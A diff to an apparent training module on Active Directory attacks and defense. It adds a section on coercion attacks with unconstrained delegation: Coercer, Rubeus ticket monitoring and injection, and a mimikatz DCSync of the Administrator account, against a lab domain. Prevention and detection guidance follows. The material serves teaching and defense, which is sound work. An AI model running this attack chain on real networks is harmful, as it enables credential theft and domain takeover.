@@ -43,8 +43,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 10. [Golden Ticket](#10-golden-ticket)
 11. [Kerberos Constrained Delegation](#11-kerberos-constrained-delegation)
 12. [Print Spooler & NTLM Relaying](#12-print-spooler--ntlm-relaying)
-13. [Interview Questions](#13-interview-questions)
-14. [Additional Resources](#14-additional-resources)
+13. [Coercing Attacks & Unconstrained Delegation](#13-coercing-attacks--unconstrained-delegation)
+14. [Interview Questions](#14-interview-questions)
+15. [Additional Resources](#15-additional-resources)
 
 ---
 
@@ -1729,7 +1730,147 @@ RegisterSpoolerRemoteRpcEndPoint = 1 (enable) or 2 (disable)
 
 ---
 
-## 13. Interview Questions
+## 13. Coercing Attacks & Unconstrained Delegation
+
+### Description
+
+> 📌 **Coercing attacks** - force machines to authenticate back to attacker, enabling privilege escalation.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|Coerce| DC[Domain Controller]
+    DC -->|Reverse connection<br/>with TGT| Attacker
+    Attacker -->|Capture TGT| UD[Unconstrained<br/>Delegation Server]
+    UD -->|DCSync| Hashes[Password Hashes]
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style DC fill:#ffcccc,stroke:#333
+```
+
+**Attack Vectors:**
+1. Relay to another DC (DCSync) - if SMB Signing disabled
+2. Force DC to connect to Unconstrained Delegation server
+3. Relay to AD Certificate Services
+4. Configure Resource-Based Kerberos Delegation
+
+**Follow-up Options:**
+- Relay to DC → DCSync
+- Force DC to UD server → Capture TGT
+- Relay to Certificate Services → Get certificate
+- Relay to configure RBKD → Escalate to admin
+
+### Attack
+
+**Step 1: Find Unconstrained Delegation systems:**
+
+```powershell
+Get-NetComputer -Unconstrained | select samaccountname
+```
+
+**Output:**
+
+```
+samaccountname
+--------------
+DC1$
+SERVER01$
+WS001$
+DC2$
+```
+
+<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/a08f12c8-9f5c-42a1-afd5-4c1c9c5a9b15" />
+
+> 💡 Domain Controllers trusted by default; WS001 and SERVER01 are targets
+
+**Step 2: Monitor for TGTs on UD server:**
+
+```powershell
+.\Rubeus.exe monitor /interval:1
+```
+
+**Output:**
+
+```
+[*] Action: TGT Monitoring
+[*] Monitoring every 1 seconds for new TGTs
+
+[*] 18/12/2022 22.37.09 UTC - Found new TGT:
+  User                  :  bob@EAGLE.LOCAL
+  StartTime             :  18/12/2022 23.30.09
+  EndTime               :  19/12/2022 09.30.09
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+```
+
+<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/d81f7b23-94fe-4594-bbde-37133895a2df" />
+
+**Step 3: Execute Coercer to coerce DC1:**
+
+```bash
+Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+```
+
+**Output:**
+
+```
+[dc1.eagle.local] Analyzing available protocols...
+   [>] Pipe '\PIPE\lsarpc' is accessible!
+       [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' ...
+       ERROR_BAD_NETPATH (Attack has worked!)
+[+] All done!
+```
+
+<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/6523c014-775f-4cf3-b765-a2b16341701b" />
+
+**Step 4: Check captured TGT:**
+
+```
+[*] 18/12/2022 22.55.52 UTC - Found new TGT:
+  User                  :  DC1$@EAGLE.LOCAL
+  StartTime             :  18/12/2022 23.30.21
+  EndTime               :  19/12/2022 09.30.21
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+```
+
+<img width="1420" height="875" alt="image" src="https://github.com/user-attachments/assets/48cd14e5-f70e-4025-a6da-afa21dd60ca2" />
+
+**Step 5: Import TGT and DCSync:**
+
+```powershell
+.\Rubeus.exe ptt /ticket:<base64_ticket>
+klist
+.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
+```
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **RPC Firewall** | Third-party like Zero Networks to block dangerous RPC |
+| **Block Outbound 139/445** | On DCs except to required AD servers |
+| **Disable Unconstrained** | Don't use UD unless necessary |
+
+> 🔴 No out-of-the-box Windows solution!
+
+### Detection
+
+**Firewall Log Analysis:**
+- Inbound connections to DC on port 445
+- Outbound connections from DC to attacker IP
+- Pattern repeats as Coercer tests different functions
+
+**Event - Connections allowed:**
+
+<img width="2419" height="1248" alt="image" src="https://github.com/user-attachments/assets/564d046e-8ce1-474f-bcfa-1027c20031e5" />
+
+**Event - Outbound blocked:**
+
+<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/2a781247-dfe2-4bf9-ae23-e04005a7fcf1" />
+
+> 💡 Any unexpected dropped traffic to ports 139 or 445 is suspicious!
+
+---
+
+## 14. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1907,7 +2048,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 14. Additional Resources
+## 15. Additional Resources
 
 ### Tools
 
